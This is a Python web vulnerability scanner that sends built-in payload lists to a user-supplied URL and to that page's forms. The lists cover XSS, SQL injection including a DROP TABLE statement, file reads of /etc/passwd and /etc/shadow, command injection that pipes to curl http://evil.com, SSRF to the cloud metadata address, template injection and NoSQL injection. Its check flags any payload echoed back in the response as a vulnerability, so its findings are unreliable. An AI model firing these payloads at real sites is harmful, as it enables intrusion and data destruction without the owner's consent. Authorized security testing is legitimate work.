#!/usr/bin/env python3

import requests, re, threading
from urllib.parse import urljoin
from bs4 import BeautifulSoup

# === Configuration ===
HEADERS = {"User-Agent": "KaliGPT-AdvScanner/2.0"}
TIMEOUT = 6

# === Templates ===
TEMPLATES = {
    "XSS": [
        '<script>alert(1)</script>', '"<script>alert(1)</script>',
        '<img src=x onerror=alert(1)>', "'><svg/onload=confirm(1)>",
        "<body onload=prompt(1)>", "<iframe src='javascript:alert(1)'>",
        "' onmouseover='alert(1)'", "<script>document.location='http://evil.com'</script>"
    ],
    "SQLi": [
        "' OR 1=1--", "' OR '1'='1", "' UNION SELECT NULL--",
        "' AND 1=0 UNION SELECT username, password FROM users--",
        "'; DROP TABLE users;--", "' OR sleep(5)--", "admin'--", "' OR 1=1#"
    ],
    "LFI": [
        "../../../../etc/passwd", "../etc/passwd", "../../../../../../../../windows/win.ini",
        "../../boot.ini", "?page=../../../../etc/passwd", "?file=../../../../../../etc/passwd"
    ],
    "RCE": [
        ";id", "&& whoami", "| uname -a", "`ls`", "$(whoami)",
        "| curl http://evil.com", "; netstat -an", "| cat /etc/passwd"
    ],
    "SSRF": [
        "http://127.0.0.1", "http://localhost:80", "http://169.254.169.254/latest/meta-data/",
        "http://0.0.0.0", "http://internal-service", "http://[::1]", "http://admin.local"
    ],
    "SSTI": [
        "{{7*7}}", "${7*7}", "<%= 7*7 %>", "{{config}}",
        "{{constructor.constructor('alert(1)')()}}", "${{7*'7'}}"
    ],
    "OpenRedirect": [
        "https://evil.com", "//evil.com", "/\\evil.com", "///evil.com", "http:\\evil.com"
    ],
    "PathTraversal": [
        "../../etc/shadow", "../../../../boot.ini", "../" * 10 + "etc/passwd", "..\\..\\..\\windows\\win.ini"
    ],
    "HeadersInjection": [
        "X-Forwarded-For: 127.0.0.1", "X-Original-URL: /admin", "X-Custom-IP-Authorization: 127.0.0.1"
    ],
    "CacheDeception": [
        "/home.php/evil.css", "/profile.jpg/random.css", "/index.php/evil.js"
    ],
    "JSONInjection": [
        '{"username":"admin","password":{"$ne":""}}', '{"$gt":""}', '{"$where":"this.credits - this.debits > 1000"}'
    ],
    "AuthBypass": [
        "' OR ''='", "admin' --", "' OR 1=1 LIMIT 1--", "' OR '1'='1' /*"
    ]
}

# === Functions ===

def log(msg, level="INFO"):
    prefix = {
        "INFO": "[*]",
        "FOUND": "[+]",
        "WARN": "[!]",
        "ERROR": "[x]"
    }.get(level, "[*]")
    print(f"{prefix} {msg}")

def try_request(session, url, **kwargs):
    try:
        return session.get(url, timeout=TIMEOUT, **kwargs)
    except requests.exceptions.ConnectTimeout:
        if url.startswith("http://"):
            https_url = url.replace("http://", "https://")
            log(f"Retrying with HTTPS: {https_url}", "WARN")
            try:
                return session.get(https_url, timeout=TIMEOUT, **kwargs)
            except Exception as e:
                log(f"HTTPS failed: {e}", "ERROR")
        else:
            log(f"Connection failed: {url}", "ERROR")
    return None

def scan_url(url):
    session = requests.Session()
    print(f"\n[•] Testing: {url}")
    for category, payloads in TEMPLATES.items():
        for payload in payloads:
            test_url = url
            if "?" in url:
                test_url = re.sub(r"(=)[^&]+", r"\1" + payload, url)
            else:
                test_url = url + "?" + "vuln=" + payload

            try:
                r = try_request(session, test_url, headers=HEADERS)
                if r and payload in r.text:
                    log(f"{category} vulnerability detected with payload: {payload}", "FOUND")
            except Exception as e:
                log(f"Error testing payload: {payload} -> {e}", "ERROR")

def extract_forms(url):
    try:
        r = requests.get(url, headers=HEADERS, timeout=TIMEOUT)
        soup = BeautifulSoup(r.text, "html.parser")
        return soup.find_all("form")
    except:
        return []

def scan_forms(url):
    log(f"Scanning forms on: {url}")
    forms = extract_forms(url)
    for form in forms:
        action = form.get("action")
        method = form.get("method", "get").lower()
        inputs = [i.get("name") for i in form.find_all("input") if i.get("name")]
        data = {}
        for category, payloads in TEMPLATES.items():
            for payload in payloads:
                data = {name: payload for name in inputs}
                full_url = urljoin(url, action)
                try:
                    if method == "post":
                        res = requests.post(full_url, data=data, headers=HEADERS)
                    else:
                        res = requests.get(full_url, params=data, headers=HEADERS)

                    if payload in res.text:
                        log(f"{category} reflected in form response at {full_url}", "FOUND")
                except Exception as e:
                    log(f"Error testing form: {e}", "ERROR")

# === Run ===
def run():
    print("─────────────────────────────────────────────")
    print("│    KRD - Ultra Web Vuln Scanner      │")
    print("─────────────────────────────────────────────")
    target = input("🌐 Enter target URL (e.g. http://testphp.vulnweb.com): ").strip()
    if not target.startswith("http"):
        target = "http://" + target
    scan_url(target)
    scan_forms(target)
    log("Scan finished!", "INFO")

# === Entry Point ===
if __name__ == "__main__":
    run()
